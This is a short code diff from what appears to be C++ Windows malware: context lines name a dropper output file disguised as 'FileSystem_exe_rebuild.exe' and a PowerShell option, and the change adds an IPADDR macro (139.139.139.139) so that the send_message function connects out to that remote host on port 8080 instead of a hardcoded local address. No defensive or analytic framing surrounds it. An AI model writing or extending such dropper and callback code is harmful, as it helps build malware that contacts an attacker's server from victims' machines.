@@ -17,6 +17,10 @@
 #define DROPPER_OUTPUT "\\FileSystem_exe_rebuild\\FileSystem_exe_rebuild.exe"
 #endif
 
+#ifndef IPADDR
+#define IPADDR "139.139.139.139"
+#endif 
+
 #ifndef POWERSHELL
 #define POWERSHELL 0
 #endif
@@ -203,7 +207,7 @@ int send_message(std::string client_message) {
 	client_addr.sin_family = AF_INET;
 	client_addr.sin_port = htons(8080);
 
-	if (inet_pton(AF_INET, "192.168.79.139", &client_addr.sin_addr) != 1) {
+	if (inet_pton(AF_INET, IPADDR, &client_addr.sin_addr) != 1) {
 		std::cerr << "inet_pton failed";
 		closesocket(client_connect);
 		WSACleanup();
